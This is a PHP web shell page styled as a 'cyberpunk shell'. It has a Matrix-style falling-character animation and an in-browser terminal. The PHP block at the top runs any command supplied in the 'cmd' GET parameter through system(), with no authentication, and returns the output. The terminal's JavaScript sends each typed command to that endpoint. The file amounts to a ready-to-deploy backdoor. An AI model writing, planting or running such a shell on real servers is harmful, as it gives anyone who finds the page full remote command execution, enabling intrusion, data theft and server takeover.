<?php
if (isset($_GET['cmd'])) {
  header('Content-Type: application/json');
  ob_start();
  system($_GET['cmd']);
  $out = ob_get_clean();
  echo json_encode(['output' => $out]);
  exit;
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>cyberpunk shell</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      color: #00ff9c;
      font-family: monospace;
      overflow: hidden;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
      display: block;
    }

    #terminal {
      position: absolute;
      top: 0; bottom: 0; left: 0; right: 0;
      display: flex;
      flex-direction: column;
      padding: 20px;
      background: transparent;
      text-shadow: 0 0 5px #00ff9c;
      z-index: 1;
    }

    #stdout {
      flex: 1;
      overflow-y: auto;
      white-space: pre-wrap;
      margin-bottom: 1em;
    }

    .cmd {
      color: #00ffaa;
    }

    #inputLine {
      display: flex;
      align-items: center;
    }

    #inputLine span {
      flex: none;
    }

    #cmdInput {
      background: transparent;
      border: none;
      color: #00ff9c;
      font: inherit;
      width: 100%;
      outline: none;
      flex: 1;
    }
  </style>
</head>
<body>
<canvas id="rain"></canvas>
<div id="terminal">
  <div id="stdout"></div>
  <div id="inputLine">
    <span>&gt; </span><input type="text" id="cmdInput" autofocus />
  </div>
</div>

<script>
  const canvas = document.getElementById('rain');
  const ctx = canvas.getContext('2d');

  let width = window.innerWidth;
  let height = window.innerHeight;
  canvas.width = width;
  canvas.height = height;

  const fontSize = 14;
  const columns = Math.floor(width / fontSize);
  const drops = Array(columns).fill(1);

  const chars = "アァイィウヴエカガキギクグケコゴサザシジスズセタダチッヂヅテトドナニヌネノハバヒビフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, width, height);

    ctx.fillStyle = "#009b6d";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const text = chars.charAt(Math.floor(Math.random() * chars.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > height || Math.random() > 0.975) {
        drops[i] = 0;
      }

      drops[i]++;
    }
  }

  setInterval(draw, 50);

  window.addEventListener('resize', () => {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    drops.length = Math.floor(width / fontSize);
    drops.fill(1);
  });
</script>

<script>
  const input = document.getElementById('cmdInput');
  const stdout = document.getElementById('stdout');


  input.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      const cmd = input.value.trim();
      if (!cmd) return;

      const div = document.createElement('div');
      div.innerHTML = `&gt; <span class="cmd"></span>`;
      div.querySelector('span.cmd').textContent = cmd;
      stdout.appendChild(div);

      input.value = '';

      try {
        const res = await fetch(`?cmd=${encodeURIComponent(cmd)}`);
        const json = await res.json();
        const outDiv = document.createElement('div');
        outDiv.textContent = json.output;
        stdout.appendChild(outDiv);
        stdout.scrollTop = stdout.scrollHeight;
      } catch (err) {
        const errDiv = document.createElement('div');
        errDiv.textContent = '[error executing command]';
        stdout.appendChild(errDiv);
      }
    }
  });

</script>
</body>
</html>